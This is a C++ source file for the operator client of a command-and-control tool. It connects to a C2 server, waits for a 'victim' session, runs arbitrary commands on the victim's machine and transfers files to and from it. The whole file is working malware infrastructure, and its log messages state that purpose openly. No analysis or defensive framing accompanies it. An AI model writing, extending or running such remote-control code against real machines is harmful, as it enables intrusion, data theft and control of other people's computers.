#include "SessionManager.hpp"
#include "Util/SafeLogger.hpp"
#include "SessionDAO.hpp"
#include "Types.hpp"
#include <SessionHandshake.hpp>
#include <SessionTransfer.hpp>
#include <memory>

SessionManager& SessionManager::instance() {
    static SessionManager instance;
    return instance;
}

const std::vector<SessionDAO>& SessionManager::getSessions() const noexcept {
    std::lock_guard lock(m_mtx);
    return m_sessions;
}

void SessionManager::setList(std::vector<SessionDAO>&& session_list) noexcept {
    std::lock_guard lock(m_mtx);
    m_sessions = std::move(session_list);
}

const SessionDAO SessionManager::getSession(int64_t id) const noexcept {
    std::lock_guard lock(m_mtx);
    auto it = std::find_if(m_sessions.begin(), m_sessions.end(), [id](const SessionDAO& v) -> bool {
        return v.id == id;
    });

    if (it != m_sessions.end()) {
        return *it;
    }

    return SessionDAO{};
}

void SessionManager::startSession(
    const std::string& host,
    int64_t port,
    const std::string& username,
    const std::string& password) {
    const UUID uuid = generate_uuid();

    auto connection = std::make_unique<SessionConnection>(
        host,
        static_cast<int>(port),
        uuid,
        username,
        password);

    SessionDAO session;
    session.port = port;
    session.uid = uuid;

    std::lock_guard lock(m_mtx);
    m_connections.emplace_back(std::move(connection));
    m_sessions.push_back(session);
    m_port_to_connection[port] = uuid;
}

SessionBridgeState SessionManager::getBridgeState(const SessionDAO& session) const noexcept {
    if (session.uid.empty()) {
        return SessionBridgeState::Failed;
    }

    std::lock_guard lock(m_mtx);
    const auto session_conn = std::find_if(
        m_connections.begin(),
        m_connections.end(),
        [&session](const std::unique_ptr<SessionConnection>& sess_ptr) -> bool {
            return session.uid == sess_ptr->get_uuid();
        });

    if (session_conn == m_connections.end()) {
        return SessionBridgeState::Failed;
    }

    return session_conn->get()->get_bridge_state();
}

void SessionManager::discardPendingOutput(const SessionDAO& session) {
    std::lock_guard lock(m_mtx);
    const auto port_it = m_port_to_connection.find(session.port);
    if (port_it == m_port_to_connection.end()) {
        return;
    }

    const auto& session_uuid = port_it->second;
    if (session_uuid.empty()) {
        return;
    }

    const auto session_conn = std::find_if(
        m_connections.begin(),
        m_connections.end(),
        [session_uuid](const std::unique_ptr<SessionConnection>& sess_ptr) -> bool {
            return session_uuid == sess_ptr->get_uuid();
        });

    if (session_conn == m_connections.end()) {
        return;
    }

    session_conn->get()->discard_pending_output();
}

std::string SessionManager::execute(const SessionDAO& session, const std::string& cmd) {
    std::unique_ptr<SessionConnection>* connection_ptr = nullptr;
    UUID session_uuid;

    {
        std::lock_guard lock(m_mtx);
        const auto port_it = m_port_to_connection.find(session.port);
        if (port_it == m_port_to_connection.end()) {
            return "";
        }

        session_uuid = port_it->second;
        if (session_uuid.empty()) {
            return "";
        }

        const auto session_conn = std::find_if(
            m_connections.begin(),
            m_connections.end(),
            [session_uuid](const std::unique_ptr<SessionConnection>& sess_ptr) -> bool {
                return session_uuid == sess_ptr->get_uuid();
            });

        if (session_conn == m_connections.end()) {
            return "";
        }

        connection_ptr = &(*session_conn);
    }

    logger::debug("Trying to send Command [{}] to Session [{}]", cmd, session_uuid);
    logger::debug("Sending Command: [{}]", cmd);
    return (*connection_ptr)->execute_cmd(cmd);
}

SessionTransferResult SessionManager::downloadFile(const SessionDAO& session, const std::string& remote_filename) {
    std::unique_ptr<SessionConnection>* connection_ptr = nullptr;
    UUID session_uuid;

    {
        std::lock_guard lock(m_mtx);
        const auto port_it = m_port_to_connection.find(session.port);
        if (port_it == m_port_to_connection.end()) {
            return {.success = false, .message = "Session not found", .data = {}};
        }

        session_uuid = port_it->second;
        const auto session_conn = std::find_if(
            m_connections.begin(),
            m_connections.end(),
            [session_uuid](const std::unique_ptr<SessionConnection>& sess_ptr) -> bool {
                return session_uuid == sess_ptr->get_uuid();
            });

        if (session_conn == m_connections.end()) {
            return {.success = false, .message = "Session not found", .data = {}};
        }

        connection_ptr = &(*session_conn);
    }

    return (*connection_ptr)->download_file(remote_filename);
}

SessionTransferResult SessionManager::uploadFile(
    const SessionDAO& session,
    const std::string& remote_filename,
    const std::string& data) {
    std::unique_ptr<SessionConnection>* connection_ptr = nullptr;
    UUID session_uuid;

    {
        std::lock_guard lock(m_mtx);
        const auto port_it = m_port_to_connection.find(session.port);
        if (port_it == m_port_to_connection.end()) {
            return {.success = false, .message = "Session not found", .data = {}};
        }

        session_uuid = port_it->second;
        const auto session_conn = std::find_if(
            m_connections.begin(),
            m_connections.end(),
            [session_uuid](const std::unique_ptr<SessionConnection>& sess_ptr) -> bool {
                return session_uuid == sess_ptr->get_uuid();
            });

        if (session_conn == m_connections.end()) {
            return {.success = false, .message = "Session not found", .data = {}};
        }

        connection_ptr = &(*session_conn);
    }

    return (*connection_ptr)->upload_file(remote_filename, data);
}

void SessionManager::close(const UUID& session_id) {
    if (session_id.empty()) {
        return;
    }

    std::lock_guard lock(m_mtx);
    const auto session_conn = std::find_if(
        m_connections.begin(),
        m_connections.end(),
        [session_id](const std::unique_ptr<SessionConnection>& sess_ptr) -> bool {
            return session_id == sess_ptr->get_uuid();
        });

    const auto session = std::find_if(
        m_sessions.begin(),
        m_sessions.end(),
        [session_id](const SessionDAO& sess) -> bool {
            return session_id == sess.uid;
        });

    if (session_conn != m_connections.end()) {
        session_conn->get()->stop();
        m_connections.erase(session_conn);
    }

    if (session != m_sessions.end()) {
        m_port_to_connection.erase(session->port);
        m_sessions.erase(session);
    }
}

SessionConnection::SessionConnection(
    std::string host,
    int port,
    std::string sid,
    std::string username,
    std::string password)
    : session_id(std::move(sid)) {
    worker = std::thread(
        &SessionConnection::connect_and_handshake,
        this,
        std::move(host),
        port,
        std::move(username),
        std::move(password));
}

SessionConnection::~SessionConnection() {
    stop();
    if (worker.joinable()) {
        worker.join();
    }
}

void SessionConnection::connect_and_handshake(
    std::string host,
    int port,
    std::string username,
    std::string password) {
    int retries = 0;
    while (not conn && retries < 5 && running) {
        try {
            logger::info("Attempting connection to {}:{} (Attempt {}/5)...", host, port, retries + 1);
            conn = std::make_unique<cpppwn::Remote>(host, port, true, false);
            logger::success("Session connection established!");
        } catch (const std::exception& e) {
            ++retries;
            logger::warn("Connection failed: {}. Retrying in 1 second...", e.what());
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }

    if (not conn || not running) {
        bridge_state = SessionBridgeState::Failed;
        logger::error("Could not reach C2 server after 5 attempts.");
        return;
    }

    try {
        session_handshake::send(*conn, session_handshake::operator_role, username, password);

        auto status = session_handshake::trim_line(conn->recvline());
        if (status == session_handshake::bridge_waiting) {
            bridge_state = SessionBridgeState::WaitingForVictim;
            logger::info("Waiting for victim to connect to session...");
            status = session_handshake::trim_line(conn->recvline());
        }

        if (status == session_handshake::bridge_ready) {
            bridge_state = SessionBridgeState::Ready;
            logger::success("Session bridge established!");
            return;
        }

        bridge_state = SessionBridgeState::Failed;
        logger::error("Unexpected session bridge status: [{}]", status);
    } catch (const std::exception& e) {
        bridge_state = SessionBridgeState::Failed;
        logger::error("Session handshake failed: {}", e.what());
    }
}

void SessionConnection::discard_pending_output_unlocked() {
    if (!conn || !conn->is_alive()) {
        return;
    }

    session_handshake::clear_recv_buffer(*conn);
}

void SessionConnection::discard_pending_output() {
    std::lock_guard lock(conn_mutex);
    discard_pending_output_unlocked();
}

std::string SessionConnection::execute_cmd(const std::string& cmd) {
    std::lock_guard lock(conn_mutex);
    if (bridge_state != SessionBridgeState::Ready) {
        return "<Session not ready>";
    }

    if (!conn || !conn->is_alive()) {
        bridge_state = SessionBridgeState::Closed;
        return "<Session disconnected>";
    }

    discard_pending_output_unlocked();
    conn->sendline(cmd);

    const auto size = std::atol(trim_string(conn->recvline()).c_str());
    if (size <= 0) {
        return "<NO DATA>";
    }

    if (static_cast<std::size_t>(size) > kMaxBridgeOutputBytes) {
        return "<Output exceeds maximum allowed size>";
    }

    return conn->recv(static_cast<std::size_t>(size));
}

namespace {

SessionTransferResult read_transfer_response(cpppwn::Remote& conn) {
    const auto size = std::atol(trim_string(conn.recvline()).c_str());
    if (size <= 0) {
        return {.success = false, .message = "<NO DATA>", .data = {}};
    }

    if (static_cast<std::size_t>(size) > kMaxBridgeOutputBytes) {
        return {.success = false, .message = "<Output exceeds maximum allowed size>", .data = {}};
    }

    const auto payload = conn.recv(static_cast<std::size_t>(size));
    if (session_transfer::is_error_payload(payload)) {
        return {.success = false, .message = payload, .data = {}};
    }

    return {.success = true, .message = payload, .data = payload};
}

} // namespace

SessionTransferResult SessionConnection::download_file(const std::string& remote_filename) {
    std::lock_guard lock(conn_mutex);
    if (bridge_state != SessionBridgeState::Ready) {
        return {.success = false, .message = "<Session not ready>", .data = {}};
    }

    if (!conn || !conn->is_alive()) {
        bridge_state = SessionBridgeState::Closed;
        return {.success = false, .message = "<Session disconnected>", .data = {}};
    }

    if (!session_transfer::is_valid_filename(remote_filename)) {
        return {.success = false, .message = "ERROR: invalid filename", .data = {}};
    }

    discard_pending_output_unlocked();
    conn->sendline(session_transfer::build_download_command(remote_filename));
    return read_transfer_response(*conn);
}

SessionTransferResult SessionConnection::upload_file(const std::string& remote_filename, const std::string& data) {
    std::lock_guard lock(conn_mutex);
    if (bridge_state != SessionBridgeState::Ready) {
        return {.success = false, .message = "<Session not ready>", .data = {}};
    }

    if (!conn || !conn->is_alive()) {
        bridge_state = SessionBridgeState::Closed;
        return {.success = false, .message = "<Session disconnected>", .data = {}};
    }

    if (!session_transfer::is_valid_filename(remote_filename)) {
        return {.success = false, .message = "ERROR: invalid filename", .data = {}};
    }

    if (data.empty() || data.size() > session_transfer::kMaxTransferBytes) {
        return {.success = false, .message = "ERROR: invalid upload size", .data = {}};
    }

    discard_pending_output_unlocked();
    conn->sendline(session_transfer::build_upload_command(remote_filename, data.size()));
    conn->send(data);
    auto result = read_transfer_response(*conn);
    result.data.clear();
    return result;
}

std::string SessionConnection::get_uuid() const {
    return session_id;
}

SessionBridgeState SessionConnection::get_bridge_state() const noexcept {
    return bridge_state.load();
}

void SessionConnection::stop() {
    running = false;
    bridge_state = SessionBridgeState::Closed;

    std::lock_guard lock(conn_mutex);
    if (conn && conn->is_alive()) {
        conn->close();
    }
}
